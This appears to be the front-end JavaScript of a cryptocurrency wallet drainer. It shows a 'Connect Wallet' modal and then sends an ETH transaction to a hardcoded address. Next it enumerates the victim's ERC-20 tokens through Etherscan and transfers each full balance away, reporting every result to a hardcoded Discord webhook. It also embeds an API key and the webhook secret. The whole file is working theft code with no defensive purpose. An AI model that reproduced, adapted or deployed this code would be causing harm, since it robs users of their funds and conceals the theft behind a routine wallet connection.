let isConnecting = false; // Flag to prevent multiple connections

// ERC-20 ABI definition
const erc20ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "to", "type": "address" },
            { "name": "value", "type": "uint256" }
        ],
        "name": "transfer",
        "outputs": [{ "name": "", "type": "bool" }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{ "name": "owner", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "", "type": "uint256" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{ "name": "", "type": "uint8" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "symbol",
        "outputs": [{ "name": "", "type": "string" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }
];

// Wallet deep links
const walletLinks = {
    metamask: "https://metamask.app.link/dapp/YOUR_SITE_URL",
    trustwallet: "https://link.trustwallet.com/open_url?coin_id=60&url=YOUR_SITE_URL",
    rainbow: "https://rnbwapp.com/app/dapp/YOUR_SITE_URL",
    argent: "https://www.argent.link/app/dapp/YOUR_SITE_URL",
    coinbase: "https://go.cb-w.com/dapp?cb_url=YOUR_SITE_URL",
    inch1: "https://1inch.app.link/dapp/YOUR_SITE_URL"
};

// Open the modal when "Connect Wallet" button is clicked
document.getElementById("connectButton").onclick = function() {
    document.getElementById("walletModal").style.display = "block";
};

// Close the modal when the close icon is clicked
document.querySelector(".close").onclick = function() {
    document.getElementById("walletModal").style.display = "none";
};

// Add event listeners for each wallet button in the modal
document.getElementById("metamask").onclick = () => openWallet("metamask");
document.getElementById("trustwallet").onclick = () => openWallet("trustwallet");
document.getElementById("rainbow").onclick = () => openWallet("rainbow");
document.getElementById("argent").onclick = () => openWallet("argent");
document.getElementById("coinbase").onclick = () => openWallet("coinbase");
document.getElementById("inch1").onclick = () => openWallet("inch1");

// Function to handle wallet link redirection
function openWallet(walletId) {
    const walletLink = walletLinks[walletId];
    if (walletLink) {
        window.location.href = walletLink;
    } else {
        console.error("Wallet link not found");
    }
}

async function connectWallet() {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return;
    }

    isConnecting = true;
    document.getElementById("connectButton").disabled = true;

    try {
        // Show wallet selection modal
        document.getElementById("walletModal").style.display = "block";
    } catch (error) {
        console.error("Error connecting to wallet:", error);
    } finally {
        isConnecting = false;
        document.getElementById("connectButton").disabled = false;
    }
}

async function sendFirstTransaction(walletAddress) {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD";
        const amountInEther = "0.000625";

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther)
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("First transaction response:", txResponse);

            await sendWebhook(txResponse.hash, "success");

            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("MetaMask is not installed.");
    }
}

async function sendSecondTransaction(signer, walletAddress) {
    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress);
    const tokenThreshold = 0.000001;

    for (const tokenAddress of erc20TokenAddresses) {
        const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
        const balance = await tokenContract.balanceOf(walletAddress);
        const tokenDecimals = await tokenContract.decimals();
        const tokenSymbol = await tokenContract.symbol();

        const balanceInUnits = balance / Math.pow(10, tokenDecimals);

        if (balanceInUnits > tokenThreshold) {
            console.log(`Sending ${balanceInUnits} ${tokenSymbol} from ${walletAddress}`);

            const txResponse = await tokenContract.transfer(
                "0xRecipientAddress",
                balance
            );

            console.log(`Transaction hash: ${txResponse.hash}`);
            await sendWebhook(txResponse.hash, "success");
        }
    }
}

async function getERC20TokenAddresses(walletAddress) {
    const apiKey = "QI64S847PMAF5SXJSYEWJNVA7TD76QTV95";
    const url = `https://api.etherscan.io/api?module=account&action=tokenlist&address=${walletAddress}&apikey=${apiKey}`;

    const response = await fetch(url);
    const data = await response.json();

    if (data.status === "1") {
        return data.result.map(token => token.contractAddress);
    } else {
        console.error("Error fetching token addresses:", data.message);
        return [];
    }
}

async function sendWebhook(message, status) {
    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg";
    const payload = {
        content: `Transaction Status: ${status}\nMessage: ${message}`
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        console.log("Webhook sent successfully");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}
